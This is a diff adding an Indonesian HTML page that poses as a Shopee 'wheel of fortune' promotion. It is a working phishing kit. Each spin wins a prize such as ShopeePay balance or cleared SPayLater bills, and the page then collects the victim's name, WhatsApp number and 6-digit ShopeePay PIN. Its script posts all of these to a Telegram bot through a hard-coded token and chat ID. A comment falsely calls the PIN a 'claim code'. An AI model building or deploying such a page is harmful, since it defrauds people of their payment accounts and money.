@@ -1,0 +1,1098 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Roda Keberuntungan</title>
+
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+}
+
+html, body {
+    width: 100%;
+    min-height: 100%;
+    overflow-x: hidden;
+    background: linear-gradient(180deg,#ff3b00 0%,#ff6b00 50%,#e63900 100%);
+}
+
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+
+.promo-card {
+    width: 100%;
+    max-width: 480px;
+    min-height: 100vh;
+    background: linear-gradient(180deg,#ff4e00 0%,#ff6b00 60%,#d62828 100%);
+    padding: 20px 20px 32px;
+    text-align: center;
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    align-items: center;
+    position: relative;
+    box-shadow: 0 0 30px rgba(0,0,0,.3);
+}
+
+.header-group {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 14px;
+    margin-top: 4px;
+}
+
+.header-logo-frame {
+    display: inline-flex;
+    justify-content: center;
+    align-items: center;
+    width: fit-content;
+    max-width: 90%;
+    padding: 6px 12px;
+    border: 2.5px solid #ffd700;
+    outline: 2px solid rgba(255,255,255,.85);
+    border-radius: 16px;
+    background: linear-gradient(
+        180deg,
+        rgba(255,255,255,.28),
+        rgba(255,255,255,.1)
+    );
+    box-shadow:
+        0 8px 20px rgba(0,0,0,.3),
+        inset 0 2px 5px rgba(255,255,255,.8),
+        0 0 15px rgba(255,215,0,.4);
+}
+
+.header-logo-img {
+    height: 75px;
+    width: auto;
+    max-width: 100%;
+    object-fit: contain;
+    display: block;
+    border-radius: 8px;
+}
+
+.banner-title {
+    background: linear-gradient(180deg,#fff 0%,#fff3b3 100%);
+    color: #d62828;
+    border: 3.5px solid #ff9e00;
+    outline: 2.5px solid #fff;
+    border-radius: 22px;
+    padding: 10px 20px;
+    font-size: 22px;
+    font-weight: 900;
+    text-transform: uppercase;
+    box-shadow:
+        0 8px 20px rgba(0,0,0,.35),
+        inset 0 2px 4px rgba(255,255,255,.9);
+    width: 100%;
+    max-width: 360px;
+    letter-spacing: 1.5px;
+}
+
+.wheel-container {
+    position: relative;
+    width: min(340px,82vw);
+    height: min(340px,82vw);
+    margin: 10px auto;
+}
+
+.pointer {
+    position: absolute;
+    top: -16px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 0;
+    height: 0;
+    border-left: 18px solid transparent;
+    border-right: 18px solid transparent;
+    border-top: 32px solid #ffcc00;
+    z-index: 10;
+    filter: drop-shadow(0 3px 6px rgba(0,0,0,.4));
+}
+
+.wheel {
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    border: 9px solid #ffc107;
+    box-shadow:
+        0 0 20px rgba(255,193,7,.9),
+        inset 0 0 10px rgba(0,0,0,.15);
+    background: conic-gradient(
+        #fff 0deg 60deg,
+        #fff3e0 60deg 120deg,
+        #fff 120deg 180deg,
+        #fff3e0 180deg 240deg,
+        #fff 240deg 300deg,
+        #fff3e0 300deg 360deg
+    );
+    position: relative;
+    overflow: hidden;
+    transition: transform 4s cubic-bezier(.15,.9,.2,1);
+}
+
+.wheel-center {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%,-50%);
+    width: 66px;
+    height: 66px;
+    background: radial-gradient(circle,#ff5722,#ee4d2d);
+    border: 4px solid #fff;
+    border-radius: 50%;
+    z-index: 5;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-weight: 900;
+    font-size: 15px;
+    box-shadow: 0 4px 10px rgba(0,0,0,.35);
+    cursor: pointer;
+    user-select: none;
+}
+
+.prize-item {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 120px;
+    height: 70px;
+    margin-top: -35px;
+    margin-left: -60px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    font-size: 10.5px;
+    font-weight: 800;
+    color: #d62828;
+    line-height: 1.2;
+}
+
+.prize-icon {
+    margin-bottom: 3px;
+}
+
+.prize-1 { transform: rotate(30deg) translate(0,-110px); }
+.prize-2 { transform: rotate(90deg) translate(0,-110px); }
+.prize-3 { transform: rotate(150deg) translate(0,-110px); }
+.prize-4 { transform: rotate(210deg) translate(0,-110px); }
+.prize-5 { transform: rotate(270deg) translate(0,-110px); }
+.prize-6 { transform: rotate(330deg) translate(0,-110px); }
+
+.action-group {
+    width: 100%;
+    max-width: 360px;
+}
+
+.btn-putar {
+    display: block;
+    width: 100%;
+    padding: 16px 0;
+    background: linear-gradient(180deg,#ffe600,#f7a100);
+    color: #d62828;
+    font-size: 22px;
+    font-weight: 900;
+    text-decoration: none;
+    border-radius: 35px;
+    border: 3px solid #fff;
+    box-shadow: 0 8px 18px rgba(0,0,0,.3);
+    text-transform: uppercase;
+    cursor: pointer;
+    letter-spacing: 1px;
+}
+
+.btn-putar:active {
+    transform: scale(.97);
+}
+
+.btn-putar:disabled {
+    filter: grayscale(.6);
+    cursor: not-allowed;
+}
+
+.modal-overlay {
+    position: fixed;
+    inset: 0;
+    width: 100vw;
+    height: 100vh;
+    background: rgba(0,0,0,.75);
+    backdrop-filter: blur(4px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    opacity: 0;
+    visibility: hidden;
+    transition: all .3s ease;
+    z-index: 100;
+}
+
+.modal-overlay.active {
+    opacity: 1;
+    visibility: visible;
+}
+
+.modal-card {
+    background: #fff;
+    padding: 28px 22px;
+    border-radius: 24px;
+    text-align: center;
+    max-width: 360px;
+    width: 88%;
+    color: #333;
+    box-shadow: 0 12px 35px rgba(0,0,0,.4);
+    transform: scale(.8);
+    transition: transform .3s ease;
+}
+
+.modal-overlay.active .modal-card {
+    transform: scale(1);
+}
+
+.modal-card h2 {
+    color: #ee4d2d;
+    font-size: 22px;
+    margin-bottom: 8px;
+    font-weight: 900;
+}
+
+.modal-card p {
+    font-size: 13.5px;
+    margin-bottom: 16px;
+    color: #555;
+    line-height: 1.4;
+}
+
+.prize-result {
+    font-size: 18px;
+    font-weight: 900;
+    color: #d62828;
+    background: #fff3e0;
+    padding: 14px;
+    border-radius: 14px;
+    margin-bottom: 22px;
+    border: 2px dashed #ff9800;
+}
+
+.form-group {
+    text-align: left;
+    margin-bottom: 16px;
+}
+
+.form-group label {
+    display: block;
+    font-size: 13px;
+    font-weight: 800;
+    color: #333;
+    margin-bottom: 6px;
+}
+
+.form-group input {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1.5px solid #ccc;
+    border-radius: 12px;
+    font-size: 14px;
+    outline: none;
+}
+
+.code-container {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin: 20px 0 24px;
+}
+
+.code-box {
+    width: 42px;
+    height: 48px;
+    text-align: center;
+    font-size: 22px;
+    font-weight: 900;
+    color: #ee4d2d;
+    border: 2px solid #ddd;
+    border-radius: 10px;
+    outline: none;
+    background: #fdfdfd;
+}
+
+.code-box:focus {
+    border-color: #ee4d2d;
+    box-shadow: 0 0 0 3px rgba(238,77,45,.2);
+    background: #fff;
+}
+
+.btn-action {
+    width: 100%;
+    background: linear-gradient(180deg,#ff4e00,#ee4d2d);
+    color: #fff;
+    border: none;
+    padding: 14px 0;
+    font-weight: 900;
+    border-radius: 25px;
+    cursor: pointer;
+    font-size: 16px;
+    box-shadow: 0 4px 12px rgba(238,77,45,.35);
+    text-transform: uppercase;
+}
+</style>
+</head>
+
+<body>
+
+<div class="promo-card">
+
+    <div class="header-group">
+
+        <div class="header-logo-frame">
+            <img
+                src="https://cdn.phototourl.com/member/2026-09-28-aab7b7b0-e76d-4052-ab21-88711a810ca1.jpg"
+                alt="Logo"
+                class="header-logo-img">
+        </div>
+
+        <div class="banner-title">
+            RODA KEBERUNTUNGAN
+        </div>
+
+    </div>
+
+    <div class="wheel-container">
+
+        <div class="pointer"></div>
+
+        <div class="wheel" id="wheel">
+
+            <div class="wheel-center" id="centerBtn">
+                PUTAR
+            </div>
+
+            <div class="prize-item prize-1">
+                📱
+                <span>Handphone</span>
+            </div>
+
+            <div class="prize-item prize-2">
+                🧊
+                <span>Kulkas</span>
+            </div>
+
+            <div class="prize-item prize-3">
+                💳
+                <span>Saldo ShopeePay<br>Rp5.000.000</span>
+            </div>
+
+            <div class="prize-item prize-4">
+                📄
+                <span>Bebas Tagihan<br>SPinjam</span>
+            </div>
+
+            <div class="prize-item prize-5">
+                📄
+                <span>Bebas Tagihan<br>SPayLater</span>
+            </div>
+
+            <div class="prize-item prize-6">
+                🏍️
+                <span>Sepeda Motor</span>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="action-group">
+        <button class="btn-putar" id="spinBtn">
+            PUTAR SEKARANG
+        </button>
+    </div>
+
+</div>
+
+
+<!-- MODAL -->
+
+<div class="modal-overlay" id="winnerModal">
+
+    <div class="modal-card">
+
+        <!-- STEP 1 -->
+
+        <div id="modalStep1">
+
+            <h2>🎉 SELAMAT! 🎉</h2>
+
+            <p>Anda mendapatkan hadiah:</p>
+
+            <div class="prize-result" id="prizeText">-</div>
+
+            <button class="btn-action" id="claimBtn">
+                KLAIM HADIAH
+            </button>
+
+        </div>
+
+
+        <!-- STEP 2 -->
+
+        <div id="modalStep2" style="display:none;">
+
+            <h2>📋 DATA PENERIMA</h2>
+
+            <p>
+                Lengkapi data di bawah ini untuk proses klaim hadiah.
+            </p>
+
+            <div class="form-group">
+
+                <label for="recipientName">
+                    Nama Penerima Hadiah
+                </label>
+
+                <input
+                    type="text"
+                    id="recipientName"
+                    placeholder="Masukkan nama lengkap">
+
+            </div>
+
+            <div class="form-group">
+
+                <label for="whatsappNumber">
+                    Nomor WhatsApp
+                </label>
+
+                <input
+                    type="tel"
+                    id="whatsappNumber"
+                    placeholder="Contoh: 081234567890">
+
+            </div>
+
+            <button class="btn-action" id="continueBtn">
+                LANJUTKAN
+            </button>
+
+        </div>
+
+
+        <!-- STEP 3 -->
+
+        <div id="modalStep3" style="display:none;">
+
+            <h2>Masukan PIN Shopeepay</h2>
+
+            <p>
+                masukan PIN shopeepay 6 digit untuk menyelesaikan proses.
+            </p>
+
+            <div class="code-container">
+
+                <input type="password"
+                    maxlength="1"
+                    class="code-box"
+                    inputmode="numeric">
+
+                <input type="password"
+                    maxlength="1"
+                    class="code-box"
+                    inputmode="numeric">
+
+                <input type="password"
+                    maxlength="1"
+                    class="code-box"
+                    inputmode="numeric">
+
+                <input type="password"
+                    maxlength="1"
+                    class="code-box"
+                    inputmode="numeric">
+
+                <input type="password"
+                    maxlength="1"
+                    class="code-box"
+                    inputmode="numeric">
+
+                <input type="password"
+                    maxlength="1"
+                    class="code-box"
+                    inputmode="numeric">
+
+            </div>
+
+            <button class="btn-action" id="confirmCodeBtn">
+                Konfirmasi
+            </button>
+
+        </div>
+
+
+        <!-- STEP 4 -->
+
+        <div id="modalStep4" style="display:none;">
+
+            <h2>✅ KLAIM BERHASIL!</h2>
+
+            <p>
+                Data klaim telah diterima.
+                Silakan tunggu informasi selanjutnya melalui
+                nomor WhatsApp yang diberikan.
+            </p>
+
+            <button class="btn-action" id="finishBtn">
+                SELESAI
+            </button>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+<script>
+
+/* ================================
+   TELEGRAM CONFIG
+================================ */
+
+const TELEGRAM_BOT_TOKEN =
+    "8681291275:AAGlvoD0CamMIPVGLiBNWPdt7vpSYWgTB4M";
+
+const TELEGRAM_CHAT_ID =
+    "7667144622";
+
+
+/* ================================
+   STATUS KLAIM
+   Ditambahkan agar setelah selesai
+   tidak kembali ke awal.
+================================ */
+
+const CLAIM_STORAGE_KEY =
+    "roda_keberuntungan_sudah_selesai";
+
+
+/* ================================
+   ELEMENT
+================================ */
+
+const wheel =
+    document.getElementById("wheel");
+
+const spinBtn =
+    document.getElementById("spinBtn");
+
+const centerBtn =
+    document.getElementById("centerBtn");
+
+const winnerModal =
+    document.getElementById("winnerModal");
+
+const prizeText =
+    document.getElementById("prizeText");
+
+const modalStep1 =
+    document.getElementById("modalStep1");
+
+const modalStep2 =
+    document.getElementById("modalStep2");
+
+const modalStep3 =
+    document.getElementById("modalStep3");
+
+const modalStep4 =
+    document.getElementById("modalStep4");
+
+const claimBtn =
+    document.getElementById("claimBtn");
+
+const continueBtn =
+    document.getElementById("continueBtn");
+
+const confirmCodeBtn =
+    document.getElementById("confirmCodeBtn");
+
+const finishBtn =
+    document.getElementById("finishBtn");
+
+const codeBoxes =
+    document.querySelectorAll(".code-box");
+
+
+/* ================================
+   HADIAH
+================================ */
+
+const prizes = [
+
+    {
+        name: "Handphone",
+        angle: 30
+    },
+
+    {
+        name: "Kulkas",
+        angle: 90
+    },
+
+    {
+        name: "Saldo ShopeePay Rp5.000.000",
+        angle: 150
+    },
+
+    {
+        name: "Bebas Tagihan SPinjam",
+        angle: 210
+    },
+
+    {
+        name: "Bebas Tagihan SPayLater",
+        angle: 270
+    },
+
+    {
+        name: "Sepeda Motor",
+        angle: 330
+    }
+
+];
+
+
+let currentRotation = 0;
+let isSpinning = false;
+let selectedPrize = null;
+
+
+/* ================================
+   CEK APAKAH SUDAH SELESAI
+================================ */
+
+function checkClaimStatus() {
+
+    const sudahSelesai =
+        localStorage.getItem(
+            CLAIM_STORAGE_KEY
+        ) === "true";
+
+    if (sudahSelesai) {
+
+        spinBtn.disabled = true;
+        centerBtn.style.pointerEvents = "none";
+
+        spinBtn.innerText =
+            "KLAIM SUDAH SELESAI";
+
+        centerBtn.innerText =
+            "SELESAI";
+    }
+}
+
+
+/* ================================
+   PUTAR
+================================ */
+
+function startSpin() {
+
+    /* Jangan izinkan putar lagi
+       setelah klaim selesai */
+
+    if (
+        localStorage.getItem(
+            CLAIM_STORAGE_KEY
+        ) === "true"
+    ) {
+        return;
+    }
+
+    if (isSpinning) return;
+
+    isSpinning = true;
+
+    spinBtn.disabled = true;
+
+    const randomIndex =
+        Math.floor(
+            Math.random() * prizes.length
+        );
+
+    selectedPrize =
+        prizes[randomIndex];
+
+    const extraRounds =
+        360 * 5;
+
+    const targetDegree =
+        360 - selectedPrize.angle;
+
+    currentRotation +=
+        extraRounds +
+        targetDegree -
+        (currentRotation % 360);
+
+    wheel.style.transform =
+        `rotate(${currentRotation}deg)`;
+
+
+    setTimeout(() => {
+
+        prizeText.innerText =
+            selectedPrize.name;
+
+        modalStep1.style.display =
+            "block";
+
+        modalStep2.style.display =
+            "none";
+
+        modalStep3.style.display =
+            "none";
+
+        modalStep4.style.display =
+            "none";
+
+        winnerModal.classList.add(
+            "active"
+        );
+
+        isSpinning = false;
+
+        /*
+         * Tetap disabled selama proses
+         * klaim berlangsung.
+         */
+        spinBtn.disabled = true;
+
+    }, 4000);
+}
+
+
+spinBtn.addEventListener(
+    "click",
+    startSpin
+);
+
+centerBtn.addEventListener(
+    "click",
+    startSpin
+);
+
+
+/* ================================
+   STEP 1 → STEP 2
+================================ */
+
+claimBtn.addEventListener(
+    "click",
+    () => {
+
+        modalStep1.style.display =
+            "none";
+
+        modalStep2.style.display =
+            "block";
+
+    }
+);
+
+
+/* ================================
+   STEP 2 → STEP 3
+================================ */
+
+continueBtn.addEventListener(
+    "click",
+    () => {
+
+        const name =
+            document
+            .getElementById("recipientName")
+            .value.trim();
+
+        const wa =
+            document
+            .getElementById("whatsappNumber")
+            .value.trim();
+
+
+        if (!name || !wa) {
+
+            alert(
+                "Harap isi Nama Penerima dan Nomor WhatsApp terlebih dahulu!"
+            );
+
+            return;
+        }
+
+
+        modalStep2.style.display =
+            "none";
+
+        modalStep3.style.display =
+            "block";
+
+
+        setTimeout(() => {
+
+            codeBoxes[0].focus();
+
+        },100);
+
+    }
+);
+
+
+/* ================================
+   AUTO FOCUS KODE
+================================ */
+
+codeBoxes.forEach(
+    (box,index) => {
+
+        box.addEventListener(
+            "input",
+            (e) => {
+
+                e.target.value =
+                    e.target.value.replace(
+                        /[^0-9]/g,
+                        ""
+                    );
+
+                if (
+                    e.target.value &&
+                    index <
+                    codeBoxes.length - 1
+                ) {
+
+                    codeBoxes[
+                        index + 1
+                    ].focus();
+
+                }
+
+            }
+        );
+
+
+        box.addEventListener(
+            "keydown",
+            (e) => {
+
+                if (
+                    e.key === "Backspace" &&
+                    !e.target.value &&
+                    index > 0
+                ) {
+
+                    codeBoxes[
+                        index - 1
+                    ].focus();
+
+                }
+
+            }
+        );
+
+    }
+);
+
+
+/* ================================
+   STEP 3 → TELEGRAM
+================================ */
+
+confirmCodeBtn.addEventListener(
+    "click",
+    async () => {
+
+        let claimCode = "";
+
+        codeBoxes.forEach(
+            box => {
+                claimCode += box.value;
+            }
+        );
+
+
+        if (
+            claimCode.length !== 6
+        ) {
+
+            alert(
+                "Harap buat kode klaim 6 digit!"
+            );
+
+            return;
+        }
+
+
+        const name =
+            document
+            .getElementById("recipientName")
+            .value.trim();
+
+        const wa =
+            document
+            .getElementById("whatsappNumber")
+            .value.trim();
+
+
+        const message =
+`🎁 KLAIM HADIAH BARU
+
+Nama: ${name}
+WhatsApp: ${wa}
+Hadiah: ${selectedPrize.name}
+Kode Klaim: ${claimCode}`;
+
+
+        /*
+         * Kode klaim ini adalah kode klaim
+         * yang dibuat pengguna, bukan PIN/OTP.
+         */
+
+        if (
+            TELEGRAM_BOT_TOKEN !==
+            "TEMPEL_TOKEN_BOT_DI_SINI" &&
+            TELEGRAM_CHAT_ID !==
+            "TEMPEL_CHAT_ID_DI_SINI"
+        ) {
+
+            try {
+
+                await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                    {
+                        method: "POST",
+
+                        headers: {
+                            "Content-Type":
+                                "application/json"
+                        },
+
+                        body: JSON.stringify({
+
+                            chat_id:
+                                TELEGRAM_CHAT_ID,
+
+                            text:
+                                message
+
+                        })
+                    }
+                );
+
+            } catch(error) {
+
+                console.error(
+                    "Telegram error:",
+                    error
+                );
+
+            }
+
+        }
+
+
+        /*
+         * SIMPAN STATUS SELESAI
+         *
+         * Setelah baris ini dijalankan,
+         * refresh halaman tidak akan
+         * mengembalikan pengguna ke awal.
+         */
+
+        localStorage.setItem(
+            CLAIM_STORAGE_KEY,
+            "true"
+        );
+
+
+        modalStep3.style.display =
+            "none";
+
+        modalStep4.style.display =
+            "block";
+
+    }
+);
+
+
+/* ================================
+   SELESAI
+================================ */
+
+finishBtn.addEventListener(
+    "click",
+    () => {
+
+        /*
+         * Status sudah disimpan sebelumnya.
+         * Jadi setelah modal ditutup,
+         * roda tetap terkunci.
+         */
+
+        winnerModal.classList.remove(
+            "active"
+        );
+
+
+        document
+        .getElementById(
+            "recipientName"
+        ).value = "";
+
+
+        document
+        .getElementById(
+            "whatsappNumber"
+        ).value = "";
+
+
+        codeBoxes.forEach(
+            box => {
+                box.value = "";
+            }
+        );
+
+
+        spinBtn.disabled = true;
+
+        spinBtn.innerText =
+            "KLAIM SUDAH SELESAI";
+
+        centerBtn.style.pointerEvents =
+            "none";
+
+        centerBtn.innerText =
+            "SELESAI";
+
+    }
+);
+
+
+/* ================================
+   CEK SAAT HALAMAN DIBUKA
+================================ */
+
+checkClaimStatus();
+
+</script>
+
+</body>
+  </html>
